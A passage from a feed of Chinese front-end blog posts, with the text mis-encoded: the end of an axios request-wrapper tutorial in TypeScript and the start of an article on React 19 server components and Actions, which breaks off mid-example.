<li>å°è£… <code>get/post</code> æ–¹æ³•ï¼šå°†ã€ŒURLã€å‚æ•°ã€é…ç½®ã€æ‹†åˆ†ï¼Œå‚æ•°æ›´æ¸…æ™°ï¼Œç¬¦åˆæ—¥å¸¸å¼€å‘ä¹ æƒ¯ï¼›</li>
<li>æ³›å‹æ”¯æŒï¼šæ–¹æ³•çº§åˆ«çš„æ³›å‹ <code>&lt;T&gt;</code> è®©ç»„ä»¶èƒ½ç²¾å‡†æŒ‡å®šè¿”å›æ•°æ®ç±»å‹ï¼ŒTS æç¤ºæ›´å‹å¥½ï¼›</li>
<li>ç»„ä»¶æ— éœ€å…³æ³¨ axios åŸç”Ÿè°ƒç”¨æ–¹å¼ï¼ˆå¦‚ <code>get</code> çš„å‚æ•°æ˜¯ <code>{ params }</code>ï¼‰ï¼Œé™ä½ä½¿ç”¨æˆæœ¬ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-17">æ­¥éª¤ 5ï¼šè¿›é˜¶ä¼˜åŒ– - è‡ªåŠ¨é€‚é… Content-Type + ç¯å¢ƒå˜é‡</h3>
<p>è§£å†³ã€Œè¡¨å• / æ–‡ä»¶ä¸Šä¼ ã€åœºæ™¯çš„è¯·æ±‚å¤´é€‚é…ï¼ŒåŒæ—¶é€šè¿‡ç¯å¢ƒå˜é‡éš”ç¦»ä¸åŒç¯å¢ƒçš„æ¥å£åœ°å€ã€‚</p>
<h4 data-id="heading-18">5.1 å‡çº§å°è£…ä»£ç ï¼ˆsrc/utils/request.tsï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¬¬äº”æ­¥ï¼šè¿›é˜¶ä¼˜åŒ–ï¼ˆContent-Typeè‡ªåŠ¨é€‚é… + ç¯å¢ƒå˜é‡ï¼‰</span>
<span class="hljs-keyword">import</span> axios, { <span class="hljs-title class_">AxiosInstance</span>, <span class="hljs-title class_">AxiosRequestConfig</span>, <span class="hljs-title class_">AxiosResponse</span>, <span class="hljs-title class_">AxiosError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ApiResponse</span>&lt;T = <span class="hljs-built_in">any</span>&gt; {
  <span class="hljs-attr">code</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">data</span>: T;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">CustomRequestConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AxiosRequestConfig</span> {
  needToken?: <span class="hljs-built_in">boolean</span>;
}

<span class="hljs-comment">// æ ¸å¿ƒä¿®æ”¹1ï¼šä»ç¯å¢ƒå˜é‡è¯»å–baseURLï¼ˆä¸å†å†™æ­»ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">request</span>: <span class="hljs-title class_">AxiosInstance</span> = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">VITE_API_BASE_URL</span>, <span class="hljs-comment">// Viteç¯å¢ƒå˜é‡ï¼ˆéœ€ä»¥VITE_å¼€å¤´ï¼‰</span>
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json;charset=utf-8'</span>,
    <span class="hljs-string">'X-Platform'</span>: <span class="hljs-string">'web'</span>
  }
});

request.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">config: CustomRequestConfig</span>) =&gt;</span> {
    <span class="hljs-comment">// 1. Tokené€»è¾‘ï¼ˆå¤ç”¨ï¼‰</span>
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">needToken</span> !== <span class="hljs-literal">false</span>) {
      <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'token'</span>);
      <span class="hljs-keyword">if</span> (token) {
        config.<span class="hljs-property">headers</span> = config.<span class="hljs-property">headers</span> || {};
        config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>;
      }
    }

    <span class="hljs-comment">// æ ¸å¿ƒæ–°å¢2ï¼šè‡ªåŠ¨é€‚é…Content-Typeï¼ˆè¡¨å•/æ–‡ä»¶ä¸Šä¼ åœºæ™¯ï¼‰</span>
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">data</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">FormData</span>) {
      <span class="hljs-comment">// æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œè‡ªåŠ¨ä¿®æ”¹ä¸ºmultipart/form-dataï¼ˆæ— éœ€æ‰‹åŠ¨è®¾ç½®ï¼‰</span>
      config.<span class="hljs-property">headers</span>[<span class="hljs-string">'Content-Type'</span>] = <span class="hljs-string">'multipart/form-data'</span>;
    }

    <span class="hljs-keyword">return</span> config;
  },
  <span class="hljs-function">(<span class="hljs-params">error: AxiosError</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
);

request.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">response: AxiosResponse&lt;ApiResponse&gt;</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> res = response.<span class="hljs-property">data</span>;
    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> !== <span class="hljs-number">200</span>) {
      <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> === <span class="hljs-number">401</span>) {
        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'token'</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Tokenè¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•'</span>);
      }
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(res.<span class="hljs-property">message</span>));
    }
    <span class="hljs-keyword">return</span> res;
  },
  <span class="hljs-function">(<span class="hljs-params">error: AxiosError</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
);

<span class="hljs-comment">// å°è£…get/postï¼ˆå¤ç”¨ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> get = &lt;T = <span class="hljs-built_in">any</span>&gt;(
  <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>,
  params?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;,
  config?: <span class="hljs-title class_">CustomRequestConfig</span>
): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ApiResponse</span>&lt;T&gt;&gt; =&gt; {
  <span class="hljs-keyword">return</span> request.<span class="hljs-title function_">get</span>(url, { params, ...config });
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> post = &lt;T = <span class="hljs-built_in">any</span>&gt;(
  <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>,
  data?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; | <span class="hljs-title class_">FormData</span>, <span class="hljs-comment">// æ”¯æŒFormDataç±»å‹</span>
  config?: <span class="hljs-title class_">CustomRequestConfig</span>
): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ApiResponse</span>&lt;T&gt;&gt; =&gt; {
  <span class="hljs-keyword">return</span> request.<span class="hljs-title function_">post</span>(url, data, config);
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> request;
</code></pre>
<h4 data-id="heading-19">5.2 é…ç½®ç¯å¢ƒå˜é‡ï¼ˆé¡¹ç›®æ ¹ç›®å½•ï¼‰</h4>
<p>åˆ›å»º <code>.env.development</code>ï¼ˆå¼€å‘ç¯å¢ƒï¼‰å’Œ <code>.env.production</code>ï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># .env.developmentï¼ˆæœ¬åœ°å¼€å‘ï¼‰</span>
<span class="hljs-attr">VITE_API_BASE_URL</span> = <span class="hljs-string">'http://localhost:3000/api'</span>

<span class="hljs-comment"># .env.productionï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰</span>
<span class="hljs-attr">VITE_API_BASE_URL</span> = <span class="hljs-string">'https://api.yourdomain.com'</span>
</code></pre>
<h4 data-id="heading-20">5.3 ç»„ä»¶ä½¿ç”¨ï¼ˆæ–‡ä»¶ä¸Šä¼ ç¤ºä¾‹ï¼‰</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { post } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/request'</span>;

<span class="hljs-comment">// æ–‡ä»¶ä¸Šä¼ ï¼šè‡ªåŠ¨é€‚é…multipart/form-dataè¯·æ±‚å¤´</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">uploadFile</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">file: File</span>) =&gt; {
  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();
  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'file'</span>, file);
  
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> post&lt;{ <span class="hljs-attr">url</span>: string }&gt;(<span class="hljs-string">'/file/upload'</span>, formData);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ–‡ä»¶åœ°å€ï¼š'</span>, res.<span class="hljs-property">data</span>.<span class="hljs-property">url</span>);
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-21">5.4 å…³é”®è§£é‡Š</h4>
<ul>
<li>ç¯å¢ƒå˜é‡ï¼šé€šè¿‡ <code>import.meta.env.VITE_API_BASE_URL</code> è¯»å–ä¸åŒç¯å¢ƒçš„æ¥å£åœ°å€ï¼Œé¿å…æ‰“åŒ…æ—¶ä¿®æ”¹ä»£ç ï¼›</li>
<li>Content-Type è‡ªåŠ¨é€‚é…ï¼šæ£€æµ‹åˆ° <code>FormData</code> æ—¶ï¼Œè‡ªåŠ¨å°†è¯·æ±‚å¤´æ”¹ä¸º <code>multipart/form-data</code>ï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®ï¼›</li>
<li>ç”Ÿäº§ç¯å¢ƒéš”ç¦»ï¼šå¼€å‘ / ç”Ÿäº§ç¯å¢ƒçš„æ¥å£åœ°å€é€šè¿‡ç¯å¢ƒå˜é‡åŒºåˆ†ï¼Œç¬¦åˆå·¥ç¨‹åŒ–æœ€ä½³å®è·µã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-22">æ€»ç»“</h3>
<p>ä»ç®€åˆ°ç¹çš„å°è£…æ ¸å¿ƒæ­¥éª¤å¯å½’çº³ä¸ºï¼š</p>
<ol>
<li><strong>åŸºç¡€å±‚</strong>ï¼šåˆ›å»º axios å®ä¾‹ + å›ºå®šé»˜è®¤è¯·æ±‚å¤´ï¼Œæ»¡è¶³æœ€åŸºæœ¬çš„è¯·æ±‚å¤´é…ç½®ï¼›</li>
<li><strong>æ ¸å¿ƒå±‚</strong>ï¼šæ·»åŠ è¯·æ±‚æ‹¦æˆªå™¨ï¼Œå®ç° Token ç­‰åŠ¨æ€è¯·æ±‚å¤´çš„æŒ‰éœ€æ·»åŠ ï¼›</li>
<li><strong>ç±»å‹å±‚</strong>ï¼šå®Œå–„ TypeScript ç±»å‹çº¦æŸï¼Œé¿å… <code>any</code> ç±»å‹ï¼Œä¿è¯ç±»å‹å®‰å…¨ï¼›</li>
<li><strong>æ˜“ç”¨å±‚</strong>ï¼šå°è£… <code>get/post</code> é€šç”¨æ–¹æ³•ï¼Œç®€åŒ–ç»„ä»¶è°ƒç”¨ï¼Œæå‡å¼€å‘æ•ˆç‡ï¼›</li>
<li><strong>ä¼˜åŒ–å±‚</strong>ï¼šè‡ªåŠ¨é€‚é… Content-Typeã€é…ç½®ç¯å¢ƒå˜é‡ï¼Œé€‚é…å¤æ‚ä¸šåŠ¡åœºæ™¯ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 19 æ ¸å¿ƒç‰¹æ€§ä¸ç‰ˆæœ¬ä¼˜åŒ–æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7604395865335513140</link>    <guid>https://juejin.cn/post/7604395865335513140</guid>    <pubDate>2026-02-09T09:21:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604395865335513140" data-draft-id="7604155045237014563" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 19 æ ¸å¿ƒç‰¹æ€§ä¸ç‰ˆæœ¬ä¼˜åŒ–æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="React.js"/> <meta itemprop="datePublished" content="2026-02-09T09:21:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’é’å®¶çš„å°ç°ç°"/> <meta itemprop="url" content="https://juejin.cn/user/2295436009545944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 19 æ ¸å¿ƒç‰¹æ€§ä¸ç‰ˆæœ¬ä¼˜åŒ–æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2295436009545944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’é’å®¶çš„å°ç°ç°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:21:59.000Z" title="Mon Feb 09 2026 09:21:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">React 19 æ ¸å¿ƒç‰¹æ€§ä¸ç‰ˆæœ¬ä¼˜åŒ–æ·±åº¦è§£æ</h2>
<h3 data-id="heading-1">â€‹<strong>ä¸€ã€React 19 æ ¸å¿ƒæ–°ç‰¹æ€§æ¦‚è¿°</strong>â€‹</h3>
<p>React 19 æ˜¯ React ç”Ÿæ€è‡ª 18 ç‰ˆæœ¬ä»¥æ¥çš„<strong>é‡å¤§é‡Œç¨‹ç¢‘</strong>ï¼Œå…¶æ ¸å¿ƒç›®æ ‡æ˜¯é€šè¿‡<strong>æ¶æ„é©æ–°</strong>ä¸<strong>å¼€å‘èŒƒå¼å‡çº§</strong>ï¼Œè§£å†³é•¿æœŸå›°æ‰°å¼€å‘è€…çš„<strong>æ€§èƒ½ç“¶é¢ˆ</strong>ä¸<strong>ä»£ç å†—ä½™</strong>é—®é¢˜ã€‚ä»¥ä¸‹æ˜¯ React 19 æœ€å…·æ ‡å¿—æ€§çš„æ–°ç‰¹æ€§ï¼š</p>
<h4 data-id="heading-2">â€‹<strong>1. æœåŠ¡å™¨ç»„ä»¶ï¼ˆServer Components, RSCï¼‰ï¼šç”Ÿäº§å°±ç»ªçš„æ¶æ„é©å‘½</strong>â€‹</h4>
<p>React 19 å°†<strong>æœåŠ¡å™¨ç»„ä»¶</strong>ä»å®éªŒæ€§åŠŸèƒ½å‡çº§ä¸º<strong>ç¨³å®šç‰¹æ€§</strong>ï¼Œå½»åº•æ”¹å˜äº† React åº”ç”¨çš„<strong>æ¸²æŸ“æ¨¡å¼</strong>ã€‚æœåŠ¡å™¨ç»„ä»¶æ˜¯<strong>è¿è¡Œåœ¨æœåŠ¡å™¨ç«¯</strong>çš„ç‰¹æ®Šç»„ä»¶ï¼Œå…¶ä»£ç ä¸ä¼šæ‰“åŒ…åˆ°å®¢æˆ·ç«¯ bundle ä¸­ï¼Œè€Œæ˜¯é€šè¿‡<strong>æµå¼ä¼ è¾“</strong>å°†æ¸²æŸ“åçš„ HTML å‘é€åˆ°å®¢æˆ·ç«¯ã€‚</p>
<ul>
<li>
<p>â€‹<strong>æ ¸å¿ƒä¼˜åŠ¿</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>é›¶å®¢æˆ·ç«¯ bundle å¢é•¿</strong>â€‹ï¼šæœåŠ¡å™¨ç»„ä»¶çš„é€»è¾‘ï¼ˆå¦‚æ•°æ®è·å–ã€å¤æ‚è®¡ç®—ï¼‰å®Œå…¨åœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œï¼Œå®¢æˆ·ç«¯æ— éœ€ä¸‹è½½ä»»ä½•ç›¸å…³ä»£ç ï¼Œæ˜¾è‘—å‡å°‘ bundle ä½“ç§¯ã€‚</li>
<li>â€‹<strong>ç›´æ¥æ•°æ®è®¿é—®</strong>â€‹ï¼šæœåŠ¡å™¨ç»„ä»¶å¯ç›´æ¥è®¿é—®æ•°æ®åº“ã€æ–‡ä»¶ç³»ç»Ÿç­‰æœåŠ¡å™¨ç«¯èµ„æºï¼Œæ— éœ€é€šè¿‡ API å±‚è½¬å‘ï¼Œç®€åŒ–æ•°æ®è·å–æµç¨‹ã€‚</li>
<li>â€‹<strong>æµå¼æ¸²æŸ“ï¼ˆStreaming SSRï¼‰â€‹</strong>â€‹ï¼šæœåŠ¡å™¨ç»„ä»¶æ”¯æŒ<strong>æµå¼ä¼ è¾“</strong>ï¼Œå³å…ˆå‘é€é¡µé¢çš„æ ¸å¿ƒå†…å®¹ï¼ˆå¦‚ headerã€å¯¼èˆªï¼‰ï¼Œå†é€æ­¥å‘é€æ¬¡è¦å†…å®¹ï¼ˆå¦‚è¯„è®ºã€æ¨èï¼‰ï¼Œæå‡ç”¨æˆ·æ„ŸçŸ¥æ€§èƒ½ã€‚</li>
</ul>
</li>
<li>
<p>â€‹<strong>ç¤ºä¾‹</strong>â€‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœåŠ¡å™¨ç»„ä»¶ï¼ˆapp/analytics/page.server.tsxï¼‰</span>
<span class="hljs-keyword">import</span> { db } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/lib/database'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AnalyticsChart</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./AnalyticsChart.client'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">AnalyticsPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// æœåŠ¡å™¨ç«¯ç›´æ¥æŸ¥è¯¢æ•°æ®åº“</span>
  <span class="hljs-keyword">const</span> metrics = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">query</span>(<span class="hljs-string">`SELECT date, revenue FROM analytics`</span>);
  <span class="hljs-keyword">const</span> aggregated = <span class="hljs-title function_">processMetrics</span>(metrics);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AnalyticsChart</span> <span class="hljs-attr">data</span>=<span class="hljs-string">{aggregated}</span> /&gt;</span></span>;
}

<span class="hljs-comment">// å®¢æˆ·ç«¯ç»„ä»¶ï¼ˆAnalyticsChart.client.tsxï¼‰</span>
<span class="hljs-string">'use client'</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">AnalyticsChart</span>(<span class="hljs-params">{ data }</span>) {
  <span class="hljs-comment">// å®¢æˆ·ç«¯äº¤äº’é€»è¾‘ï¼ˆå¦‚ç­›é€‰ã€ tooltipï¼‰</span>
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-3">â€‹<strong>2. åŠ¨ä½œï¼ˆActionsï¼‰ï¼šç®€åŒ–æ•°æ®å˜æ›´çš„â€œå£°æ˜å¼ç¥å™¨â€â€‹</strong>â€‹</h4>
<p>React 19 å¼•å…¥<strong>Actions API</strong>ï¼Œæ—¨åœ¨<strong>æ¶ˆé™¤æ•°æ®å˜æ›´ï¼ˆå¦‚è¡¨å•æäº¤ã€API è°ƒç”¨ï¼‰çš„æ ·æ¿ä»£ç </strong>ã€‚Actions æ˜¯<strong>å£°æ˜å¼çš„å¼‚æ­¥æ“ä½œ</strong>ï¼Œå¯è‡ªåŠ¨ç®¡ç†<strong>åŠ è½½çŠ¶æ€</strong>ã€<strong>é”™è¯¯å¤„ç†</strong>ä¸<strong>ä¹è§‚æ›´æ–°</strong>ï¼Œæ— éœ€æ‰‹åŠ¨ç¼–å†™Â <code>useState</code>Â æˆ–Â <code>useEffect</code>ã€‚</p>
<ul>
<li>
<p>â€‹<strong>æ ¸å¿ƒä¼˜åŠ¿</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>è‡ªåŠ¨çŠ¶æ€ç®¡ç†</strong>â€‹ï¼šActions å†…ç½®Â <code>isPending</code>ï¼ˆåŠ è½½ä¸­ï¼‰ã€<code>error</code>ï¼ˆé”™è¯¯ï¼‰ç­‰çŠ¶æ€ï¼Œæ— éœ€æ‰‹åŠ¨ç»´æŠ¤ã€‚</li>
<li>â€‹<strong>ä¹è§‚æ›´æ–°æ”¯æŒ</strong>â€‹ï¼šé€šè¿‡Â <code>useOptimistic</code>Â Hookï¼Œå¯åœ¨è¯·æ±‚æäº¤æ—¶<strong>ç«‹å³æ›´æ–° UI</strong>â€‹ï¼ˆå¦‚ç‚¹èµæŒ‰é’®çš„â€œå·²ç‚¹èµâ€çŠ¶æ€ï¼‰ï¼Œæå‡ç”¨æˆ·ä½“éªŒã€‚</li>
<li>â€‹<strong>è¡¨å•é›†æˆ</strong>â€‹ï¼š<code>&lt;form&gt;</code>Â å…ƒç´ å¯ç›´æ¥ç»‘å®š Actionsï¼Œè‡ªåŠ¨å¤„ç†è¡¨å•æäº¤ä¸é‡ç½®ï¼Œæ— éœ€æ‰‹åŠ¨è°ƒç”¨Â <code>preventDefault</code>Â æˆ–Â <code>fetch</code>ã€‚</li>
</ul>
</li>
<li>
<p>â€‹<strong>ç¤ºä¾‹</strong>â€‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åŠ¨ä½œå‡½æ•°ï¼ˆactions/user.tsï¼‰</span>
<span class="hljs-string">'use server'</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateUserProfile</span>(<span class="hljs-params">prevState, formData</span>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> updated = <span class="hljs-keyword">await</span> db.<span class="hljs-property">user</span>.<span class="hljs-title function_">update</span>({ <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: session.<span class="hljs-property">userId</span> }, <span class="hljs-attr">data</span>: formData });
    <span class="hljs-title function_">revalidatePath</span>(<span class="hljs-string">'/profile'</span>); <span class="hljs-comment">// é‡æ–°éªŒè¯é¡µé¢æ•°æ®</span>
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">user</span>: updated };
